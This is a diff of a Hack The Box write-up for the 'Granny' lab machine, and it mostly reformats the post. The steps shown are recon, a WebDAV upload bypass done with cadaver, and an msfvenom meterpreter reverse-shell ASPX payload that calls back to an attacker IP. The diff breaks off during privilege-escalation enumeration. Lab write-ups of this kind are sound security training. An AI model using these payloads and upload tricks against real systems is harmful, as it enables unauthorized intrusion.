@@ -2,12 +2,13 @@
 title: Hack The Box - Granny
 date: 2022-01-6 08:10:00
 categories: [hackthebox]
-tags: [windows]
+tags: [windows,cve,metasploit,webdav,easy]
 math: true
 mermaid: true
 toc: true
 comments: true
 ---
+![](/assets/Hackthebox/Granny/0.png)
 ## RECON
 ### NMAP
 
@@ -15,8 +16,7 @@ Starting with `nmap`, nmap shows only port `80(http)`  is open.
 - Port 80 : Microsoft IIS httpd 6.0
 
 ```bash
-┌─[root@linux]─[/home/htb/windows_box/granny] 
-└──╼ #nmap -sT -p- --min-rate 10000 -oA granny-alltcp.htb 10.10.10.15 
+# nmap -sT -p- --min-rate 10000 -oA granny-alltcp.htb 10.10.10.15 
 Starting Nmap 7.92 ( https://nmap.org ) at 2023-01-04 14:32 +0545 
 Nmap scan report for 10.10.10.15 
 Host is up (0.077s latency). 
@@ -25,8 +25,7 @@ PORT   STATE SERVICE
 80/tcp open  http 
 Nmap done: 1 IP address (1 host up) scanned in 43.54 seconds
 
-┌─[root@linux]─[/home/htb/windows_box/granny] 
-└──╼ #nmap -p 80 -sC -sV 10.10.10.15 
+# nmap -p 80 -sC -sV 10.10.10.15 
 Starting Nmap 7.92 ( https://nmap.org ) at 2023-01-04 14:34 +0545 
 Nmap scan report for 10.10.10.15 
 Host is up (0.072s latency). 
@@ -59,12 +58,10 @@ Nmap done: 1 IP address (1 host up) scanned in 9.51 seconds
 
 Site shows it's under construction.
 
-
 ### Headers:
 
 ```bash
-┌─[root@linux]─[/home/htb/windows_box/granny] 
-└──╼ #curl -I 10.10.10.15 
+# curl -I 10.10.10.15 
 HTTP/1.1 500 Internal Server Error 
 Content-Length: 69 
 Content-Type: text/html 
@@ -101,20 +98,19 @@ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
 /IMAGES               (Status: 301) [Size: 149] [--> http://10.10.10.15/IMAGES/]
 /_private             (Status: 301)
 ```
-Both /images  and /_private  are empty dirs.
+Both /images and /_private  are empty dirs.
 
 ### WebDAV
 
 Above nmap scan shows that webdav methods such as PUT, MOVE are enabled and we can use to upload files.
 
 
-### davtest
+### Davtest
 
 We'll use davtest  to explore further, and it will show us what types of files can be uploaded, and if it can create a directory:
 
 ```bash
-┌─[root@linux]─[/home/htb/windows_box/granny] 
-└──╼ #davtest -url http://10.10.10.15 
+# davtest -url http://10.10.10.15 
 ******************************************************** 
  Testing DAV connection 
 OPEN            SUCCEED:                http://10.10.10.15 
@@ -165,11 +161,10 @@ We can upload alotof file types but not aspx, which is what we want.
 
 ### Meterpreter
 
-Creating a windows meterpreter reverse shell.
+Creating a windows `meterpreter` reverse shell.
 
 ```bash
-┌─[root@linux]─[/home/htb/windows_box/granny]
-└──╼ #msfvenom -p windows/meterpreter/reverse_tcp lhost=10.10.14.22 lport=4444 -f aspx > shell.aspx
+# msfvenom -p windows/meterpreter/reverse_tcp lhost=10.10.14.22 lport=4444 -f aspx > shell.aspx
 [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
 [-] No arch selected, selecting arch: x86 from the payload
 No encoder specified, outputting raw payload
@@ -177,18 +172,16 @@ Payload size: 354 bytes
 Final size of aspx file: 2886 bytes
 ```
 
-Since  davtest suggested we cannot upload aspx  directly so first we have to rename shell.aspx  as shell.txt  then rename it later as shell.aspx  once uploaded.
+Since `davtest` suggested we cannot upload `aspx`  directly so first we have to rename shell.aspx  as shell.txt  then rename it later as shell.aspx  once uploaded.
 
 mv shell.aspx shell.txt
-
 
 ### cadaver
 
 We'll use cadvaer  tool to upload files to the server.
 
 ```bash
-┌─[✗]─[root@linux]─[/home/htb/windows_box/granny] 
-└──╼ #cadaver -t 10.10.10.15 
+# cadaver -t 10.10.10.15 
 dav:/> put shell.txt 
 Uploading shell.txt to `/shell.txt': 
 Progress: [=============================>] 100.0% of 2886 bytes succeeded. 
@@ -214,7 +207,7 @@ Coll:   images                                 0  Apr 12  2017
 dav:/>
 ```
 
-Here, we have uploaded shell.txt  using the PUT  method which was successful and then renamed to shell.aspx  using the MOVE  method. 
+Here, we have uploaded shell.txt using the PUT method which was successful and then renamed to shell.aspx using the MOVE  method. 
 
 start metasploit multi handler.
 ```bash
@@ -251,7 +244,6 @@ nt authority\network service
 
 
 ## SHELL AS SYSTEM
-
 ```bash
 msf6 post(multi/recon/local_exploit_suggester) > run 
 [*] 10.10.10.15 - Collecting local exploits for x86/windows... 
